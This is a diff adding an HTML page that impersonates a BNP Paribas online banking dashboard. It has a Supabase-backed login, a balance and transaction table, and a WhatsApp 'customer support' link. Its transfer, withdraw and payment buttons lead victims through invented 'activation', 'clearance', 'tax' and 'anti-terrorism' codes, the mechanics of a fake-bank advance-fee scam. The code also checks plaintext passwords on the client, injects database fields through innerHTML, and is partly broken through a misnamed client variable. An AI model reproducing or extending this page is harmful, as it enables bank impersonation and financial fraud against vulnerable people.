@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>account Dashboard</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.42.3/dist/umd/supabase.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+  display: flex;
+  justify-content: center;
+  align-items: start;
+  min-height: 100vh;
+  background: #f9f9f9;
+  margin: 0;
+}
+    body {
+  font-family: 'Inter', sans-serif; /* or 'Poppins' */
+  background-color: #f4f6f8;
+  color: #333;
+  margin: 0;
+  padding: 0;
+}
+h1, h2, h3, h4 {
+  font-weight: 600;
+}
+    #loginForm, #dashboard {
+      max-width: 600px;
+      margin: 30px auto;
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+    }
+    h2 { color: #00945e; }
+    .badge {
+      padding: 5px 10px;
+      border-radius: 5px;
+      background-color: gray;
+      color: white;
+    }
+    .badge.active { background-color: #00945e; }
+    .badge.pending { background-color: orange; }
+    .badge.block { background-color: red; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+    }
+    th, td {
+      border: 1px solid #ccc;
+      padding: 8px;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+      margin-bottom: 15px;
+    }
+    button {
+      padding: 10px 15px;
+      background-color: #00945e;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    #logoutBtn {
+      float: right;
+      background: crimson;
+    }
+  </style>
+  <style>
+body {
+  margin: 0;
+  font-family: "Segoe UI", Roboto, sans-serif;
+  background: #f4f7fb;
+  color: #222;
+}
+
+
+.container {
+  width: 100%;
+  max-width: 1000px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+
+/* 1. Global sizing */
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+/* 2. Responsive container */
+.container {
+  width: 100%;
+  max-width: 1000px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+/* 3. Media Queries (already partially present, just improve) */
+@media screen and (max-width: 768px) {
+  .dashboard-container {
+    padding: 16px;
+    margin: 20px 10px;
+  }
+}
+
+@media screen and (max-width: 480px) {
+  .dashboard-container {
+    width: 95%;
+    padding: 16px;
+  }
+
+  .bottom-nav {
+    flex-direction: row;
+    height: auto;
+  }
+
+  .nav-item .material-icons {
+    font-size: 20px;
+  }
+}
+.dashboard-container {
+  max-width: 450px;
+  margin: 20px auto;
+  background: white;
+  border-radius: 20px;
+  padding: 20px;
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.07);
+  overflow: hidden;
+  overflow-x: auto ;
+}
+
+/* Make layout responsive on all screen sizes */
+body {
+  margin: 0;
+  font-family: 'Poppins', sans-serif;
+  background: #f4f7fb;
+  color: #222;
+}
+
+.dashboard-container {
+  max-width: 100%;
+  width: 95%;
+  margin: 10px auto;
+  background: #fff;
+  border-radius: 16px;
+  padding: 20px;
+  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.05);
+  box-sizing: border-box;
+}
+
+.header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+}
+
+.header h4 {
+  margin: 0;
+  color: #0070ba;
+  font-weight: 600;
+  font-size: 18px;
+}
+
+#logoutBtn {
+  background-color: #e60023;
+  border: none;
+  color: white;
+  padding: 8px 14px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.balance-section {
+  background: linear-gradient(to right, #0070ba, #00a8e8);
+  color: white;
+  border-radius: 16px;
+  padding: 20px;
+  margin: 20px 0;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+}
+
+#balance {
+  font-size: 28px;
+  font-weight: bold;
+  display: inline-block;
+  margin-left: 5px;
+}
+
+/* Transaction history table styles */
+.transaction-title {
+  font-size: 16px;
+  margin-bottom: 10px;
+  color: #0070ba;
+  font-weight: 600;
+}
+
+.table-container {
+  width: 100%;
+  overflow-x: auto;
+  border-radius: 12px;
+  background: #fff;
+  box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 14px;
+  min-width: 700px;
+}
+
+thead {
+  background: #f0f3f7;
+  position: sticky;
+  top: 0;
+  z-index: 1;
+}
+
+th, td {
+  padding: 12px 10px;
+  text-align: left;
+  border-bottom: 1px solid #eee;
+  white-space: nowrap;
+}
+
+/* Responsive fixes for small screens */
+@media (max-width: 768px) {
+  .dashboard-container {
+    width: 98%;
+    padding: 16px;
+    border-radius: 12px;
+  }
+
+  .header h4 {
+    font-size: 16px;
+  }
+
+  #logoutBtn {
+    padding: 6px 10px;
+    font-size: 12px;
+  }
+
+  .balance-section {
+    padding: 16px;
+  }
+
+  #balance {
+    font-size: 24px;
+  }
+
+  table {
+    font-size: 13px;
+  }
+
+  .transaction-title {
+    font-size: 15px;
+  }
+}
+.header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+.header h4 {
+  margin: 0;
+  color: #0070ba;
+  font-weight: 600;
+  font-size: 18px;
+}
+
+#logoutBtn {
+  background-color: #e60023;
+  border: none;
+  color: white;
+  padding: 8px 14px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.balance-section {
+  background: linear-gradient(to right, #0070ba, #00a8e8);
+  color: white;
+  border-radius: 16px;
+  padding: 20px;
+  margin-bottom: 25px;
+  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+}
+
+.balance-section p {
+  margin: 10px 0;
+  font-size: 14px;
+}
+
+#balance {
+  font-size: 32px;
+  font-weight: bold;
+  display: inline-block;
+  margin-left: 5px;
+}
+
+.badge {
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 12px;
+  color: white;
+  background: #888;
+}
+
+.badge.active {
+  background: #2ecc71;
+}
+.badge.pending {
+  background: #f1c40f;
+}
+.badge.block {
+  background: #e74c3c;
+}
+
+.transaction-title {
+  font-size: 16px;
+  margin-bottom: 10px;
+  color: #0070ba;
+  font-weight: 600;
+}
+.transaction-history {
+  width: 100%;
+  overflow-x: auto;
+  border-collapse: collapse;
+  margin-top: 20px;
+}
+.transaction-history th,
+.transaction-history td {
+  text-align: left;
+  padding: 12px 16px;
+  font-size: 15px;
+  min-width: 100px;
+  white-space: nowrap;
+}
+
+.transaction-history th:nth-child(4),
+.transaction-history td:nth-child(4) {
+  min-width: 200px; /* for long descriptions */
+}
+@media screen and (max-width: 768px) {
+  .dashboard-container {
+    padding: 20px;
+  }
+
+  .transaction-history {
+    display: block;
+    overflow-x: auto;
+  }
+}
+.table-container {
+  overflow-x: auto;
+  border-radius: 10px;
+  background: #fff;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 14px;
+}
+
+thead {
+  background: #f0f3f7;
+  position: sticky;
+  top: 0;
+  z-index: 2;
+}
+
+th, td {
+  padding: 12px 10px;
+  text-align: left;
+  border-bottom: 1px solid #eee;
+  white-space: nowrap;
+}
+
+@media (max-width: 480px) {
+  
+  	.dashboard-container {
+  max-width: 800px; /* increase from 400px or whatever it was */
+  width: 90%;
+  margin: 40px auto;
+  background-color: #fff;
+  padding: 30px;
+  border-radius: 10px;
+  box-shadow: 0 0 12px rgba(0, 0, 0, 0.15);
+}
+ 
+  #balance {
+    font-size: 28px;
+  }
+
+  .header h4 {
+    font-size: 16px;
+  }
+
+  #logoutBtn {
+    padding: 6px 10px;
+    font-size: 12px;
+  }
+}
+
+.bottom-nav {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 64px;
+  display: flex;
+  background: #fff;
+  box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+  justify-content: space-around;
+  align-items: center;
+  z-index: 1000;
+  border-top: 1px solid #eee;
+}
+
+.nav-item {
+  flex-grow: 1;
+  text-align: center;
+  font-size: 12px;
+  color: #444;
+  text-decoration: none;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  transition: all 0.2s ease;
+}
+
+.nav-item:hover {
+  color: #0070ba;
+}
+
+.nav-item .material-icons {
+  font-size: 24px;
+  margin-bottom: 2px;
+}
+</style>
+<style>
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.4);
+    display: none;
+    justify-content: flex-end;
+    z-index: 1000;
+  }
+
+  .bottom-sheet {
+    width: 100%;
+    max-width: 600px;
+    margin: 0 auto;
+    background: #fff;
+    padding: 20px;
+    border-radius: 16px 16px 0 0;
+    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+    animation: slideUp 0.3s ease-out;
+  }
+
+  @keyframes slideUp {
+    from {
+      transform: translateY(100%);
+    }
+    to {
+      transform: translateY(0);
+    }
+  }
+
+  .bottom-sheet h3 {
+    text-align: center;
+    margin-bottom: 1em;
+  }
+
+  .bottom-sheet input {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+  }
+
+  .bottom-sheet button {
+    width: 100%;
+    background: #2e7d32;
+    color: white;
+    padding: 14px;
+    margin-top: 12px;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.2s ease-in-out;
+  }
+
+  .bottom-sheet button:hover {
+    background: #1b5e20;
+  }
+
+ 
+  .quick-actions {
+    display: flex;
+    gap: 1rem;
+    flex-wrap: wrap;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .quick-actions .action-button {
+    background-color: #2196f3;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 16px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    transition: transform 0.2s ease, background 0.3s ease;
+  }
+
+  .quick-actions .action-button:hover {
+    background-color: #1976d2;
+    transform: scale(1.05);
+  }
+
+  .quick-actions .action-button i {
+    margin-right: 8px;
+  }
+
+  @media (max-width: 600px) {
+    .quick-actions {
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .quick-actions .action-button {
+      width: 90%;
+    }
+  }
+
+
+#profileCard {
+  display: flex;
+  align-items: center;
+  background-color: #f8fafd;
+  border: 1px solid #dfe6ef;
+  border-radius: 12px;
+  box-shadow: 0 4px 12px rgba(0, 82, 204, 0.1);
+  padding: 20px;
+  max-width: 480px;
+  margin: 20px auto;
+  font-family: 'Segoe UI', sans-serif;
+  transition: transform 0.2s ease-in-out;
+}
+
+#profileCard:hover {
+  transform: scale(1.01);
+}
+
+.avatar-box {
+  width: 64px;
+  height: 64px;
+  border-radius: 50%;
+  background-color: #e8f0fe;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-right: 18px;
+  flex-shrink: 0;
+}
+
+.avatar-icon {
+  width: 52px;
+  height: 52px;
+}
+
+.profile-info p {
+  margin: 6px 0;
+  font-size: 16px;
+  color: #333;
+}
+
+.profile-info span {
+  color: #0052cc;
+  font-weight: 600;
+}
+.modal {
+  display: none;
+  position: fixed;
+  z-index: 9999;
+  left: 0; top: 0;
+  width: 100%; height: 100%;
+  background-color: rgba(0,0,0,0.6);
+  justify-content: center;
+  align-items: center;
+}
+
+.modal.active {
+  display: flex;
+}
+
+.modal-content {
+  background-color: #fff;
+  padding: 20px 30px;
+  border-radius: 10px;
+  max-width: 90%;
+  text-align: center;
+  box-shadow: 0 0 15px rgba(0,0,0,0.3);
+  font-family: Arial, sans-serif;
+}
+
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #ccc;
+  border-top-color: #2e8b57; /* Bank green color */
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px auto;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+</style>
+<style>
+  @import url('https://fonts.googleapis.com/icon?family=Material+Icons');
+
+  .whatsapp-support-btn {
+    position: fixed;
+    bottom: 320px;
+    right: 20px;
+    z-index: 9999; /* Always above everything */
+    background-color: #25D366; /* WhatsApp green */
+    color: white;
+    font-size: 25px;
+    padding: 60px;
+    border-radius: 50%;
+    text-align: center;
+    text-decoration: none;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    transition: transform 0.3s ease;
+  }
+
+  .whatsapp-support-btn:hover {
+    transform: scale(1.1);
+    background-color: #128C7E;
+  }
+
+
+  @media (max-width: 768px) {
+    .whatsapp-support-btn {
+      bottom: 20px;
+      right: 20px;
+      font-size: 54px;
+      padding: 12px;
+      z-index: 9999;
+    }
+  }
+</style>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" / 
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</head>
+<body>
+	<script type="text/javascript">
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement(
+      {
+        pageLanguage: 'en',
+        includedLanguages: 'tr,th,ko,ja,en,fr,de,it,es,ru,pt,pl,nl,uk,zh-CN,hi,id,vi,ar,fa,ms,fil,bn,ro,el,hu,cs,sk,sv,no,da,fi,he,ur,te,ml,my,ne',
+        layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+      },
+      'google_translate_element'
+    );
+  }
+	  </script>
+    	<div id="google_translate_element"></div>
+<div class="container">
+	
+<div id="loginForm">
+	
+  <h4>welcome To BNP PARIBAS BANK </h4>
+  <h2>Login To Your Account</h2>
+  <input type="email" id="email" placeholder="Email" required />
+  <input type="password" id="password" placeholder="Password" required />
+  <button onclick="login()">Login</button>
+</div>
+
+
+
+<div id="dashboard" style="display:none;">
+  <div class="dashboard-container">
+    <div class="header">
+      <h4>Your account</h4>
+      <button id="logoutBtn" onclick="logout()">Logout</button>
+    </div>
+    
+ <div id="profileCard" class="profile-card-container">
+  <div class="avatar-box">
+    <svg class="avatar-icon" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="32" cy="32" r="30" fill="#0052cc" />
+      <circle cx="32" cy="22" r="10" fill="#fff" />
+      <path d="M16,54c0-10,8-14,16-14s16,4,16,14" fill="#fff" />
+    </svg>
+  </div>
+  <div class="profile-info">
+    <p><strong>Name:</strong> <span id="profileName">Loading...</span></p>
+    <p><strong>Account Number:</strong> <span id="accountNumber">Loading...</span></p>
+  </div>
+</div>
+    
+    
+    <div class="balance-section">
+      <p><strong>Balance:</strong> €<span id="balance">0.00</span></p>
+      <p><strong>Status:</strong> <span class="badge" id="statusBadge">-</span></p>
+      <p><strong>Last Updated:</strong> <span id="timestamp">-</span></p>
+    </div>
+
+    <h2 class="transaction-title">Transaction History</h2>
+    <button onclick="downloadStatement()" style="margin-bottom: 15px; background: #0070ba; border-radius: 8px;">Download Statement (PDF)</button>
+    <div class="table-container">
+      <table>
+        
+        <thead>  
+  <tr>
+    <th>Time</th>
+    <th>Type</th>
+    <th>Amount</th>
+    <th>Description</th>
+    <th>Sender Name</th>
+    <th>Bank Name</th>
+    <th>Sender Account #</th>
+    <th>Txn Type</th>
+    <th>SWIFT Code</th>
+    <th>Txn Ref</th>
+  </tr>  
+</thead>
+       
+        <tbody id="transactionTableBody"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+<br/>
+<br/>
+
+<div class="quick-actions">
+  <button class="action-button" id="withdrawButton">
+    <i class="fas fa-money-bill-wave"></i> Withdraw
+  </button>
+  <button class="action-button" id="transferButton">
+    <i class="fas fa-exchange-alt"></i> Transfer
+  </button>
+  <button class="action-button" id="paymentButton">
+    <i class="fas fa-file-invoice"></i> Payments
+  </button>
+</div>
+
+
+<!-- Bottom Navigation Bar -->
+<nav class="bottom-nav">
+  <a href="open_account.html" class="nav-item" aria-label="Checking Accounts">
+    <span class="material-icons">account_balance</span>
+    <span>Savings Account</span>
+  </a>
+  <a href="open_account.html" class="nav-item" aria-label="Mortgages & Loans">
+    <span class="material-icons">home</span>
+    <span>Loans Account</span>
+  </a>
+  <a href="open_account.html" class="nav-item" aria-label="Insurance">
+    <span class="material-icons">verified_user</span>
+    <span>Investment Account</span>
+  </a>
+  <a href="open_account.html" class="nav-item" aria-label="Ventures & Retirement">
+    <span class="material-icons">trending_up</span>
+    <span>Current Account</span>
+  </a>
+</nav>
+</div>
+
+<div class="modal-overlay" id="modalOverlay">
+  <div class="bottom-sheet" id="bottomSheet">
+    <h3 id="modalTitle">Action</h3>
+    <label for="fullName">Full Name</label>
+    <input id="fullName" ...>
+    	<label for="fullName">Bank Name</label>
+    <input id="bankName" ...>
+    	<label for="fullName">Account Number</label>
+    <input id="accountNumber" ...>
+    	<label for="fullName"> Enter Amount</label>
+    <input id="codeInput" ...>
+    <button id="submitAction">Transfer Now</button>
+  </div>
+  <!-- Modal Structure -->
+<div class="modal" id="modal">
+  <div class="modal-content" id="modalContent"></div>
+  
+
+</div>
+</div>
+<!-- Floating WhatsApp Support Icon -->
+<a href="https://wa.me/17752778323" target="_blank" class="whatsapp-support-btn" title="Chat with Customer Support">
+  <span class="material-icons">support_agent</span>
+</a>
+<script>
+  const supabase = window.supabase.createClient(
+  'https://iurbleizodevsuharmau.supabase.co', // Project URL
+  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cmJsZWl6b2RldnN1aGFybWF1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc4MDg3MDgsImV4cCI6MjA3MzM4NDcwOH0.L4yM0U6deTKD7No5IfK642zlj4IRtHk_lAolmqF5Rmk' // Anon Key
+);
+
+  let userId = null;
+
+  async function login() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    const { data, error } = await supabaseClient
+      .from('users')
+      .select('*')
+      .eq('email', email)
+      .eq('password', password)  // ⚠️ You can replace with hashed check later
+      .single();
+
+    if (error || !data) {
+      alert("Invalid email or password.");
+      return;
+    }
+
+    userId = data.id;
+    localStorage.setItem("custom_user_id", userId);
+    showDashboard();
+  }
+
+
+  async function showDashboard() {
+    document.getElementById("loginForm").style.display = "none";
+    document.getElementById("dashboard").style.display = "block";
+
+    loadAccountInfo();
+    loadTransactions();
+
+    setInterval(() => {
+      loadAccountInfo();
+      loadTransactions();
+      loadUserBasicInfo();
+    }, 3000);
+  }
+
+  async function logout() {
+    localStorage.removeItem("custom_user_id");
+    location.reload();
+  }
+  
+  
+
+  async function loadAccountInfo() {
+  try {
+    // Step 1: Fetch data from Supabase
+    const { data, error } = await supabaseClient
+      .from('users')
+      .select('*')
+      .eq('id', userId)
+      .single();
+
+    // Step 2: Handle Supabase errors
+    if (error) {
+      console.error("Supabase Error:", error.message);
+      alert("Failed to load account information. Please try again.");
+      return;
+    }
+
+    // Step 3: If data was found, update UI
+    if (data) {
+      console.log("User data received:", data);
+
+      // Balance
+      const balanceEl = document.getElementById("balance");
+      if (balanceEl) {
+        balanceEl.textContent = (data.balance || 0).toFixed(2);
+      } else {
+        console.warn("Element with ID 'balance' not found in the DOM.");
+      }
+
+      // Status badge
+      const badge = document.getElementById("statusBadge");
+      if (badge) {
+        badge.textContent = data.status;
+        badge.className = `badge ${data.status}`;
+      } else {
+        console.warn("Element with ID 'statusBadge' not found in the DOM.");
+      }
+
+      // Timestamp
+      const timestampEl = document.getElementById("timestamp");
+      if (timestampEl) {
+        timestampEl.textContent = new Date(data.updated_at || data.created_at).toLocaleString();
+      } else {
+        console.warn("Element with ID 'timestamp' not found in the DOM.");
+      }
+    } else {
+      alert("No user record found.");
+    }
+  } catch (err) {
+    // Step 4: Catch any other runtime errors
+    console.error("Unexpected Error:", err);
+    alert("An unexpected error occurred while loading your account info.");
+  }
+}
+async function loadUserBasicInfo() {
+  try {
+    const { data, error } = await supabaseClient
+      .from('users')
+      .select('first_name, last_name, account_number')
+      .eq('id', userId)
+      .single();
+
+    if (error) {
+      console.error("Supabase Error:", error.message);
+      alert("Failed to load user information.");
+      return;
+    }
+
+    if (data) {
+      console.log("Basic user info received:", data);
+
+      // 🧑 Full Name
+      const nameEl = document.getElementById("profileName");
+      if (nameEl) nameEl.textContent = `${data.first_name} ${data.last_name}`;
+
+      // 🔢 Account Number
+      const acctEl = document.getElementById("accountNumber");
+      if (acctEl) acctEl.textContent = data.account_number;
+    } else {
+      alert("User not found.");
+    }
+  } catch (err) {
+    console.error("Unexpected Error:", err);
+    alert("An error occurred while loading user info.");
+  }
+}
+
+  async function loadTransactions() {
+    const { data, error } = await supabaseClient
+      .from('transactions')
+      .select('*')
+      .eq('user_id', userId)
+      .order('created_at', { ascending: false });
+
+    const tbody = document.getElementById("transactionTableBody");
+    tbody.innerHTML = '';
+
+    if (!data || data.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="4">No transactions found.</td></tr>`;
+      return;
+    }
+data.forEach(tx => {
+      const row = document.createElement('tr');
+      
+      row.innerHTML = `
+  <td>${new Date(tx.created_at).toLocaleString()}</td>
+  <td>${tx.type}</td>
+  <td>$${parseFloat(tx.amount).toFixed(2)}</td>
+  <td>${tx.description || '-'}</td>
+  <td>${tx.sender_name || '-'}</td>
+  <td>${tx.bank_name || '-'}</td>
+  <td>${tx.sender_account_number || '-'}</td>
+  <td>${tx.transaction_type || '-'}</td>
+  <td>${tx.swift_code || '-'}</td>
+  <td>${tx.transaction_ref || '-'}</td>
+`;
+  
+      tbody.appendChild(row);
+    });
+  } 
+    
+  
+  
+</script>
+<script>
+	
+  async function downloadStatement() {
+    const accountData = await supabaseClient
+      .from('users')
+      .select('*')
+      .eq('id', userId)
+      .single();
+
+    const transactionsData = await supabaseClient
+      .from('transactions')
+      .select('*')
+      .eq('user_id', userId)
+      .order('created_at', { ascending: false });
+
+    const { jsPDF } = window.jspdf;
+    const doc = new jsPDF();
+
+    let y = 10;
+
+    // Header
+    doc.setFontSize(16);
+    doc.text("Statement of Account", 10, y);
+    y += 10;
+
+    doc.setFontSize(12);
+    doc.text(`Name: ${accountData.data?.name || 'N/A'}`, 10, y); y += 7;
+    doc.text(`Email: ${accountData.data?.email || 'N/A'}`, 10, y); y += 7;
+    doc.text(`Balance: $${(accountData.data?.balance || 0).toFixed(2)}`, 10, y); y += 7;
+    doc.text(`Status: ${accountData.data?.status || 'N/A'}`, 10, y); y += 15;
+
+    doc.setFontSize(14);
+    doc.text("Transactions:", 10, y);
+    y += 10;
+
+    if (!transactionsData.data || transactionsData.data.length === 0) {
+      doc.setFontSize(12);
+      doc.text("No transactions found.", 10, y);
+    } else {
+      doc.setFontSize(10);
+
+      transactionsData.data.forEach(tx => {
+        if (y > 260) {
+          doc.addPage();
+          y = 10;
+        }
+
+        const dateStr = new Date(tx.created_at).toLocaleString();
+        const amountStr = `$${parseFloat(tx.amount).toFixed(2)}`;
+
+        // First row
+        doc.text(`Date: ${dateStr}`, 10, y);
+        doc.text(`Type: ${tx.type || '-'}`, 80, y);
+        doc.text(`Amount: ${amountStr}`, 140, y);
+        y += 6;
+
+        // Description (wrapped)
+        const descText = doc.splitTextToSize(`Desc: ${tx.description || '-'}`, 180);
+        doc.text(descText, 10, y);
+        y += descText.length * 5;
+
+        // Sender name & Bankp
+        doc.text(`Sender: ${tx.sender_name || '-'}`, 10, y);
+        doc.text(`Bank: ${tx.bank_name || '-'}`, 80, y);
+        y += 6;
+
+        // Account & Transaction Type
+        doc.text(`Acct #: ${tx.sender_account_number || '-'}`, 10, y);
+        doc.text(`Txn Type: ${tx.transaction_type || '-'}`, 80, y);
+        y += 6;
+
+        // SWIFT & Ref
+        doc.text(`SWIFT: ${tx.swift_code || '-'}`, 10, y);
+        doc.text(`Txn Ref: ${tx.transaction_ref || '-'}`, 80, y);
+        y += 10; // space before next transaction
+      });
+    }
+
+    doc.save("statement_of_account.pdf");
+  }
+ // Call the function once DOM is ready
+</script>
+<script>
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalTitle = document.getElementById('modalTitle');
+  const codeInput = document.getElementById('codeInput');
+  const submitAction = document.getElementById('submitAction');
+
+  let currentAction = '';
+  const codes = {
+    transfer: 'ACT1234',
+    withdraw: 'COT5678',
+    payments: 'CLF9999'
+  };
+
+  const redirectURL = 'https://bnp-paribas-banking.github.io/BNP-PARISBAS-BANKING/tax_clearance.html'; // Change as needed
+
+  function openModal(actionType) {
+    modalOverlay.style.display = 'flex';
+    currentAction = actionType;
+    codeInput.value = '';
+
+    switch (actionType) {
+      case 'transfer':
+        modalTitle.textContent = 'Transfer Funds';
+        codeInput.placeholder = 'Enter Amount';
+        break;
+      case 'withdraw':
+        modalTitle.textContent = 'Withdraw Funds';
+        codeInput.placeholder = 'Enter Amount';
+        break;
+      case 'payments':
+        modalTitle.textContent = 'Payment Request';
+        codeInput.placeholder = 'Enter Amount';
+        break;
+    }
+  }
+
+  document.getElementById('transferButton').addEventListener('click', () => openModal('transfer'));
+  document.getElementById('withdrawButton').addEventListener('click', () => openModal('withdraw'));
+  document.querySelector('.action-button:nth-child(3)').addEventListener('click', () => openModal('payments'));
+  
+  
+  
+
+  submitAction.addEventListener('click', async () => {
+  const modal = document.getElementById('modal');
+  const modalContent = document.getElementById('modalContent');
+
+  const codes = {
+    activation: "ACT1234",
+    transfer: "COT5678",
+    clearance: "CLF9999",
+    tax: "TCX-PARIBAS-2024",
+    anti: "ATFCX-BNP-2024"
+  };
+
+  const redirectURL = " https://bnp-paribas-banking.github.io/BNP-PARISBAS-BANKING"; // Replace with actual URL
+
+  function showModal(content) {
+    modalContent.innerHTML = content;
+    modal.classList.add('active');
+  }
+
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  async function requestCode(codeKey, message, nextStep) {
+    showModal(`<div class="spinner"></div><p>${message}</p>`);
+    await delay(3000);
+
+    showModal(`
+      <h3>Bank Verification</h3>
+      <p>${message}</p>
+      <input type="text" id="${codeKey}Input" placeholder="Enter ${codeKey} code" />
+      <button id="submit${codeKey}">Submit</button>
+    `);
+
+    return new Promise(resolve => {
+      document.getElementById(`submit${codeKey}`).addEventListener('click', async () => {
+        const value = document.getElementById(`${codeKey}Input`).value.trim();
+        if (value === codes[codeKey]) {
+          showModal(`<div class="spinner"></div><p>Processing...</p>`);
+          await delay(5000);
+          resolve(true);
+        } else {
+          alert('Incorrect code. Please contact bank support.');
+          resolve(false);
+        }
+      });
+    });
+  }
+
+function hideModal() {
+  document.getElementById('modal').classList.remove('active');
+}
+  // 🔁 Begin Steps
+  const step1 = await requestCode('activation', 'Please enter your activation code to begin your transaction.');
+  if (!step1) return;
+
+  const step2 = await requestCode('transfer', 'Enter the transfer code to continue.');
+  if (!step2) return;
+
+  const step3 = await requestCode('clearance', 'Enter the clearance code to proceed.');
+  if (!step3) return;
+
+  const step4 = await requestCode('tax', 'Enter the tax clearance code to continue.');
+  if (!step4) return;
+
+  const step5 = await requestCode('anti', 'Enter anti-terrorism clearance code.');
+  if (!step5) return;
+
+  showModal(`
+    <h3>✅ Transaction Complete</h3>
+    <p>Your transaction has been verified and approved.</p>
+  `);
+  await delay(3000);
+  window.location.href = redirectURL;
+});
+
+  // Close modal on outside click
+  modalOverlay.addEventListener('click', e => {
+    if (e.target === modalOverlay) {
+      modalOverlay.style.display = 'none';
+    }
+  });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</body>
+</html>
